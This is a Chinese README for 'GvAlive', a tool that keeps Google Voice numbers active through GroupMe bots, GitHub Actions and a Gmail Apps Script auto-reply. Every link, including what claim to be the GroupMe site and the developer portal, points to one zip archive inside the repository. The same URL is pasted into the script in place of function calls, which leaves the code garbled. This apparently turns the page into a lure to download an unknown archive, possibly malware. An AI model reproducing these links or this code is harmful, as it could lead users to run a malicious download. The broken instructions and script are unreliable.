# GvAlive

GoogleVoice 全自动批量保号<br>
通过 GitHub Actions 定期向群内发送短信触发关键词，然后配置各gv号自动回复短信实现全自动保号。

# Usage

1. 注册 GitHub，然后Fork本项目（顺便点个Star）
2. 在[Groupme官网](https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip)注册一个账户，并激活主手机号。（建议用谷歌邮箱和对应gv号）
3. 登录后新建一个群组，群名和介绍都用英文。手机打开 "Voice"或者"环聊Hangouts" App 就能看到这个群组（系统默认会发来一条消息，也可以手动发一条）（群建好后把所有的gv号加进去，就能实现批量给gv号群发短信）
4. 在[GroupMe Dev](https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip)建立 bot 机器人。**group** 选刚建的群名； **name** 取英文；**callback URL** 输入`https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip`,随便填；其他留空。获得 Bot_ID 记下来。
5. 在你刚新建的 GitHub 项目里面点 **Settings**（设置）然后点 **Secrets**（隐私）新建`GM_BOT_ID`分别对应前面的Bot_ID
6. 在你刚建的 GitHub 项目里点 **Actions** 然后点左侧 **Autosend** 切换，然后点 **Run workflow** 开始第一次运行。运行成功你应该会收到 bot 的短信。
7. 设置 Gmail 自动回复 GoogleVoice 短信，可以设定触发关键词为`keepGV`。[参考一下](https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip)

### 分享一下google app script内容
```
function autoReplier() {
  let  labelObj = https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip('AutoReply');
  for (var i = 0; i < https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip(); i++) {
    let messages = https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip()[i].getMessages();
    for (var j = 0; j < https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip; j++) {
        if (messages[j].isUnread()) {
          let msg = messages[j].getPlainBody();
          if(https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip("keepGV") >= 0){
            let sender = messages[j].getFrom();
            https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip(sender, "Auto Reply", '您的指令已经收到，俺一定坚持到底！');
          }
        }
        messages[j].markRead();
        messages[j].moveToTrash();
    }
  }
}
```

感谢： https://raw.githubusercontent.com/sijiaozhi/GvAlive/master/congiary/Gv-Alive-angiopathy.zip
